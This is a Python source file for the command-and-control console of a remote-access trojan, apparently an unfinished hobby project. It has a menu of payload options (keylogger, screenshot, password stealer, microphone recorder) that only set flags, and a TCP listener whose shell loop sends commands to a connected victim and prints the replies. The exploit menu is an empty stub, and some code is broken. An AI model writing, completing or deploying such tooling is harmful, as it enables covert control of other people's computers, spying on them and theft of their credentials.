import socket
import os
import sys
import colorama
import time


        
options = '''
keylogger
screenshot
recurring
emailupdate
passwdstealer
micrecorder
***Type no <option> to cancel option***
***Type listen to initialize listener***
    '''

keylogger = False
screenshot = False
recurring = False
emailupdate = False
passwdstealer = False
micrecorder = False
shell = False

def main():
    os.system('cls')
    print('                                                                        ')
    print('██╗     ██╗███████╗████████╗███╗   ██╗███████╗███╗   ██╗███████╗██████╗ ')
    print('██║     ██║██╔════╝╚══██╔══╝████╗  ██║██╔════╝████╗  ██║██╔════╝██╔══██╗')
    print('██║     ██║███████╗   ██║   ██╔██╗ ██║█████╗  ██╔██╗ ██║█████╗  ██████╔╝')
    print('██║     ██║╚════██║   ██║   ██║╚██╗██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗')
    print('███████╗██║███████║   ██║   ██║ ╚████║███████╗██║ ╚████║███████╗██║  ██║')
    print('╚══════╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝')
    print('Select which options you put for your payload')
    while True:
        
        inp = input(':>')
        if inp == 'options':
            print(options)
        elif inp == 'keylogger':
            keylogger = True
            print('keylogger ---> True')
        elif inp == 'screenshot':
            screenshot = True
            print('screenshot ---> True')
        elif inp == 'recurring':
            recurring = True
            print('recurring ---> True')
        elif inp == 'emailupdate':
            emailupdate = True
            print('emailupdate ---> True')
        elif inp == 'passwdstealer':
            passwdstealer = True
            print('passwdstealer  ---> True')
        elif inp == 'micrecorder':
            micrecorder = True
            print('micrecorder  ---> True')
        elif inp == 'cls':
            os.system('cls')
            main()
        elif inp == 'no keylogger':
            keylogger = False
            print('keylogger ---> False')
        elif inp == 'no screenshot':
            screenshot = False
            print('screenshot ---> False')
        elif inp == 'no recurring':
            recurring = False
            print('recurring ---> False')
        elif inp == 'no emailupdate':
            emailupdate = False
            print('emailupdate ---> False')
        elif inp == 'no passwdstealer':
            passwdstealer = False
            print('passwdstealer  ---> False')
        elif inp == 'no micrecorder':
            micrecorder = False
            print('micrecorder  ---> False')
        elif inp == 'exit':
            print('bye bye')
            exit()
        elif inp == 'listen':
            ip = input('Enter Listening IP:>')
            port = int(input('Enter Listening Port:>'))
            listen(ip, port)
        else:
            print('unrecognized command')
            time.sleep(1)
            main()
def lists():
    print('cool')

def exploit():
    print('----------EXPLOITS------------')
    print('Type list To List Exploits     ')
    print('Exploit syntax: <exploit name> ')
    print('------------------------------')
    inp = (':>')
    if inp == 'list':
        lists()
        
    
def shell():
    command = input(':>')
    if command == 'back':
        os.system('cls')
        connect()
    try:
        conn.send(command.encode())
        rx = conn.recv(1024)
        rx = rx.decode()
        print('>', rx)
        shell()
    except:
        print('Connection Closed :( ')
        print('Going back to listener')
        sock.close()
        time.sleep(2)
        main()
        
        

def connect():
        print('--------YOURE IN----------')
        print('      1. Exploits         ')
        print('      2. Shell            ')
        print('      3. Exit             ')
        print('--------------------------')
        inp = input(':>')
        if inp == '1':
            exploit()
        elif inp == '2':
            print('Type "back" to go to previous menu')
            shell()
        elif inp == '3':
            print('bye bye')
            time.sleep(1)
            exit() 
        else:
            print('unrecognized command')
            time.sleep(1)
            os.system('cls')
            connect()
            
def listen(ip, port):
    global conn
    global addr
    global sock
    global serv
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.bind((ip, port))
    serv.listen()
    print('Listening on Port:', port,' on IP:', ip)
    while True:
        conn, addr = serv.accept()
        from_client = ''
        with conn:
            print('Connection Established')
            print('Session Created with' , addr)
            connect()
main()
